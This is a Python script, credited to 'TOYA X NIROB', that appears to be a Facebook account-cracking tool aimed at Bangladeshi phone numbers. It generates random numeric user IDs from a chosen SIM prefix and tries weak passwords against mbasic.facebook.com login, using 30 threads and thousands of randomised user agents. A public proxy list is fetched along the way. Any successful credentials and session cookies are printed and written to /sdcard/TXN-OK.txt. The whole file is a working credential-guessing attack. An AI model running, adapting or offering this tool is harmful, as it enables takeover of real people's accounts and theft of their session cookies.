#DEVELOPER'S - TOYA X NIROB#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	alhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(alhaj)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    alhaj=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(alhaj)

for ua in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	y=random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
	c='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	alhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(alhaj)
os.system("xdg-open https://facebook.com/groups/1340349556561353/")
# LOGO
logo = ("""
\033[1;32m┏┳┓┏┓┓┏┏┓      ┳┓┳┳┓┏┓┳┓  
 ┃ ┃┃┗┫┣┫  ┓┏  ┃┃┃┣┫┃┃┣┫  
\033[1;32m ┻ ┗┛┗┛┛┗  ┛┗  ┛┗┻┛┗┗┛┻┛
        \033[1;32m[ UPDATE : \033[1;91m1.7 \033[1;32m[√] ]
\033[1;91m╔══════════════════════════╗
\033[1;32m   [ DEVELOPER : TOYA X NIROB
\033[1;32m   [ GITHUB : NIROB0777
\033[1;32m   [ FACEBOOK : TOYA X NIROB CYBER ZONE
\033[1;91m╚══════════════════════════""")
 #-----------UGEN---------#
 ugen2=('Mozilla/5.0 (iPhone; CPU iPhone OS 9_9_5; like Mac OS X) AppleWebKit/601.43 (KHTML, like Gecko)  Chrome/50.0.3510.293 Mobile Safari/534.2',
'Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/603.12 (KHTML, like Gecko) Chrome/49.0.1384.377 Safari/534',
'Mozilla/5.0 (Linux; U; Android 7.0; GT-I9300 Build/KTU84P) AppleWebKit/603.19 (KHTML, like Gecko)  Chrome/52.0.2561.267 Mobile Safari/603.6',
'Mozilla/5.0 (Windows; Windows NT 10.1; WOW64) AppleWebKit/534.38 (KHTML, like Gecko) Chrome/52.0.3651.135 Safari/534',
'Mozilla/5.0 (Windows; U; Windows NT 10.3; Win64; x64; en-US) AppleWebKit/533.22 (KHTML, like Gecko) Chrome/53.0.2640.336 Safari/535.6 Edge/9.17781',
'Mozilla/5.0 (Windows; U; Windows NT 10.4;) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/54.0.1340.256 Safari/602',
'Mozilla/5.0 (Linux i683 x86_64) AppleWebKit/603.11 (KHTML, like Gecko) Chrome/52.0.2702.145 Safari/602',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;; en-US Trident/5.0)',
'Mozilla/5.0 (Android; Android 5.0.2; LG-D335 Build/LRX22G) AppleWebKit/602.42 (KHTML, like Gecko)  Chrome/49.0.3375.152 Mobile Safari/537.6',
'Mozilla/5.0 (Linux; U; Linux i672 x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2052.354 Safari/535',)
 
# MAIN MANU 
def Main():
        os.system("clear")
        print(logo)
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(" \033[1;35m[\033[1;32m1\033[1;35m] \033[1;32mBD RANDOM CLONING")
        print(" \033[1;35m[\033[1;32m0\033[1;35m] \033[1;31mEXIT TERMINAL")
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Nirob =input("\n \033[1;35m[🌺\033[1;35m] \033[1;32mCHOOSE OPTION : ")
        if Nirob in ["1","01"]:
            sexy()
        if Nirob in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    user=[]
    os.system('clear')
    print(logo)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32m[🌺\033[1;32m]\033[1;36m EXAMPLE : \033[1;32m[\033[1;33m016\033[1;32m]\033[1;35m [\033[1;32m017\033[1;35m] \033[1;33m[\033[1;34m018\033[1;33m] \033[1;34m[\033[1;33m019\033[1;34m]')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code = input('\033[1;33m[🍁\033[1;32m]\033[1;32m YOUR SIM CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print('\033[1;32m[🌺\033[1;32m]\033[1;36m EXAMPLE : \033[1;32m[\033[1;33m3000\033[1;32m]\033[1;35m [\033[1;32m5000\033[1;35m] \033[1;33m[\033[1;34m10000\033[1;33m] ')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit = int(input('\033[1;33m[🍁\033[1;32m]\033[1;32mENTER YOUR LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as asha:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print('\033[1;33m[🌺\033[1;32m] \033[1;36mYOUR CRACK LIMIT : \033[1;32m'+tl)
        print("\033[1;33m[🌺\033[1;32m] \033[1;36mSELECTED SIM CODE :\033[1;32m "+code)
        print('\033[1;33m[🍁\033[1;32m]\033[1;35m PLEASE WAIT CLONING START')
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            asha.submit(alhaj,uid,pwx,tl)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [🍁] YOUR CRACK HAS BEEN COMPLETE')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alhaj(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;32m[TXN_SCANNING]\033[1;36m🌺[%s/%s]🍁\033[1;32m[TXN-SUCCESS-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=Afeu87ocu_9wCyybuUYaLqoME1zGNPv-S90KJX4rqv8Pbv3egYsDofgwftzEklhRi6fo-3jrfgR_rlk9A9fbHhnAVCP4845w0xDzM2FEWqjAwQ&smuh=13191&lh=Ac_Xiz_kQgN15eTEmo0&wtsid=rdr_0SR78TSbIhy2QwCOA&ref_component=mbasic_footer&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.57"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"itel S661LP"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
    'viewport-width': '980',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mTXN-OK\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[🌺] COOKIE :\033[1;95m {coki}")
                open('/sdcard/TXN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
# END #
